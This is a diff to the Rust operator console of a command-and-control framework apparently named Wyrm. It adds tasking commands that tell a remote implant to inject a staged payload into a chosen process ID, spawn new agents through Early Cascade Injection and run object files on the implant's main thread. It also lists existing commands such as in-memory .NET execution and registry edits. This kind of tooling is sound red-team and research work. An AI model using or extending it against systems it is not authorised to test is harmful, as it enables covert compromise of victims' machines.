@@ -3,9 +3,11 @@ use std::{collections::HashMap, mem::take};
 use chrono::{DateTime, Utc};
 use leptos::prelude::{Read, RwSignal, Update, Write, use_context};
 use shared::{
-    pretty_print::print_failed,
     task_types::{RegAddInner, RegQueryInner, RegType},
-    tasks::{AdminCommand, DELIM_FILE_DROP_METADATA, DotExInner, FileDropMetadata, WyrmResult},
+    tasks::{
+        AdminCommand, DELIM_FILE_DROP_METADATA, DotExInner, FileDropMetadata, InjectInnerForAdmin,
+        InjectInnerForPayload, WyrmResult,
+    },
 };
 use thiserror::Error;
 
@@ -27,7 +29,7 @@ pub enum TaskDispatchError {
     BadTokens(String),
     #[error("Agent ID not present in task dispatch")]
     AgentIdMissing(#[from] IsTaskingAgentErr),
-    #[error("Failed to deserialise data. {0}")]
+    #[error("Failed to serialise/deserialise data. {0}")]
     DeserialisationError(#[from] serde_json::Error),
 }
 
@@ -266,8 +268,8 @@ pub async fn remove_agent(agent: &IsTaskingAgent) -> DispatchResult {
 }
 
 pub fn unknown_command() -> DispatchResult {
-    print_failed(
-        "Unknown command or you did not supply the correct number of arguments. Type \"help {command}\" \
+    leptos::logging::log!(
+        "Unknown command or you did not supply the correct number of arguments. Type \"help (command)\" \
         to see the instructions for that command.",
     );
 
@@ -440,6 +442,9 @@ pub async fn show_help(agent: &IsTaskingAgent) -> DispatchResult {
         "reg del <path_to_key> <Optional: value name> (for more info, type help reg)".into(),
         "dotex <bin> <args> (execute a dotnet binary in memory in the implant, for more info type help dotex)".into(),
         "whoami (natively, without powershell/cmd, retrieves your SID, domain\\username and token privileges".into(),
+        "spawn <staged name> (spawns a new Wyrm agent through Early Cascade Injection)".into(),
+        "inject <staged name> <target pid>".into(),
+        "wof <function name> (run's a Wyrm Object File [statically linked only right now] on the agent's main thread)".into(),
     ];
 
     if let IsTaskingAgent::Yes(agent_id) = agent {
@@ -632,7 +637,7 @@ pub async fn reg_query_del(
     agent.has_agent_id()?;
 
     if inputs.is_empty() {
-        print_failed("Please specify options.");
+        leptos::logging::log!("Please specify options.");
     }
 
     //
@@ -697,7 +702,7 @@ pub async fn reg_add(inputs: String, agent: &IsTaskingAgent) -> DispatchResult {
     agent.has_agent_id()?;
 
     if inputs.is_empty() {
-        print_failed("Please specify options.");
+        leptos::logging::log!("Please specify options.");
     }
 
     //
@@ -759,7 +764,7 @@ pub async fn dotex(inputs: String, agent: &IsTaskingAgent) -> DispatchResult {
     agent.has_agent_id()?;
 
     if inputs.is_empty() {
-        print_failed("Please specify options.");
+        leptos::logging::log!("Please specify options.");
     }
 
     let slices = split_string_slices_to_n(0, &inputs, DiscardFirst::Chop).ok_or_else(|| {
@@ -813,6 +818,87 @@ pub async fn spawn(raw_input: String, agent: &IsTaskingAgent) -> DispatchResult 
     Ok(Some(
         api_request(
             AdminCommand::Spawn(target_path),
+            agent,
+            None,
+            C2Url::Standard,
+            None,
+        )
+        .await?,
+    ))
+}
+
+pub async fn run_static_wof(agent: &IsTaskingAgent, raw_input: String) -> DispatchResult {
+    agent.has_agent_id()?;
+
+    let mut builder = vec![];
+    let args = match split_string_slices_to_n(2, &raw_input, DiscardFirst::Chop) {
+        Some(mut inner) => {
+            builder.push(take(&mut inner[0]));
+
+            let mut args = take(&mut inner[1]);
+            args.push('\0'); // add a null byte on for C compat
+            builder.push(args);
+            Some(builder)
+        }
+        None => match split_string_slices_to_n(1, &raw_input, DiscardFirst::Chop) {
+            Some(mut s) => {
+                builder.push(take(&mut s[0]));
+                Some(builder)
+            }
+            None => None,
+        },
+    };
+
+    let ser = match serde_json::to_string(&args) {
+        Ok(s) => s,
+        Err(e) => {
+            return Err(TaskingError::TaskDispatchError(
+                TaskDispatchError::DeserialisationError(e),
+            ));
+        }
+    };
+
+    Ok(Some(
+        api_request(
+            AdminCommand::StaticWof(ser),
+            agent,
+            None,
+            C2Url::Standard,
+            None,
+        )
+        .await?,
+    ))
+}
+
+pub async fn inject(agent: &IsTaskingAgent, raw_input: String) -> DispatchResult {
+    agent.has_agent_id()?;
+
+    let (payload, pid_as_string) = match split_string_slices_to_n(2, &raw_input, DiscardFirst::Chop)
+    {
+        Some(mut inner) => (take(&mut inner[0]), (take(&mut inner[1]))),
+        None => {
+            return Err(TaskingError::TaskDispatchError(
+                TaskDispatchError::BadTokens("Could not get data from tokens in move_file.".into()),
+            ));
+        }
+    };
+
+    let Ok(pid) = pid_as_string.parse::<u32>() else {
+        return Err(TaskingError::TaskDispatchError(
+            TaskDispatchError::BadTokens(format!(
+                "Could not parse PID to a u32. Got: {pid_as_string}"
+            )),
+        ));
+    };
+
+    let inner = InjectInnerForAdmin {
+        download_name: payload,
+        pid,
+    };
+
+    Ok(Some(
+        api_request(
+            AdminCommand::Inject(inner),
             agent,
             None,
             C2Url::Standard,
